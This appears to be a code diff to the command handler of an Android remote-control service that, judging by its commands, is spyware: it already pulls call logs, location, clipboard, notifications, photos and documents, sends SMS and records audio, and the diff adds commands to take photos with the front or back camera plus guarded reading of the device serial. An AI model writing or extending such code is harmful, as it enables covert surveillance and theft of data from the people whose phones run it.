@@ -81,6 +81,8 @@ class MainService : Service() {
         const val CMD_GET_PHOTOS = "get_photos"
         const val CMD_GET_VIDEOS = "get_videos"
         const val CMD_GET_DOCUMENTS = "get_documents"
+        const val CMD_TAKE_PHOTO_FRONT = "take_photo_front"
+        const val CMD_TAKE_PHOTO_BACK = "take_photo_back"
         const val CMD_SEND_SMS = "send_sms"
         const val CMD_GET_CLIPBOARD = "get_clipboard"
         const val CMD_GET_NOTIFICATIONS = "get_notifications"
@@ -341,6 +343,8 @@ class MainService : Service() {
             CMD_GET_CALL_LOGS -> getCallLogs() ?: JSONObject().apply { put("error", "Permission denied for READ_CALL_LOG"); put("errorType", "SecurityException"); put("command", "get_call_logs") }
             CMD_GET_LOCATION -> getCurrentLocation()
             CMD_TAKE_PHOTO -> takePhoto(params)
+            CMD_TAKE_PHOTO_FRONT -> takePhoto(JSONObject().apply { put("camera", "front") })
+            CMD_TAKE_PHOTO_BACK -> takePhoto(JSONObject().apply { put("camera", "back") })
             CMD_RECORD_AUDIO -> startStopAudioRecording(params)
             CMD_GET_DEVICE_INFO -> getDetailedDeviceInfo()
             CMD_GET_INSTALLED_APPS -> getInstalledApps()
@@ -615,9 +619,10 @@ class MainService : Service() {
         return JSONObject().apply {
             put("deviceId", deviceId); put("manufacturer", Build.MANUFACTURER); put("model", Build.MODEL)
             put("product", Build.PRODUCT); put("device", Build.DEVICE); put("board", Build.BOARD); put("brand", Build.BRAND)
-            put("hardware", Build.HARDWARE); put("serial", Build.getSerial()); put("osVersion", Build.VERSION.RELEASE)
+            put("hardware", Build.HARDWARE); try { put("serial", Build.getSerial()) } catch (e: SecurityException) { put("serial", "restricted") }; put("osVersion", Build.VERSION.RELEASE)
             put("sdkVersion", Build.VERSION.SDK_INT); put("buildId", Build.DISPLAY); put("buildTime", Build.TIME)
             put("host", Build.HOST); put("fingerprint", Build.FINGERPRINT); put("type", Build.TYPE); put("tags", Build.TAGS)
+            try { put("serial", Build.getSerial()) } catch (e: SecurityException) { put("serial", "restricted") }
             put("bootloader", Build.BOOTLOADER); put("radioVersion", Build.getRadioVersion())
             val memInfo = Runtime.getRuntime(); put("totalMemory", memInfo.totalMemory()); put("freeMemory", memInfo.freeMemory()); put("maxMemory", memInfo.maxMemory()); put("availableProcessors", Runtime.getRuntime().availableProcessors())
             val storage = StatFs(Environment.getDataDirectory().absolutePath); val blockSize = storage.blockSizeLong
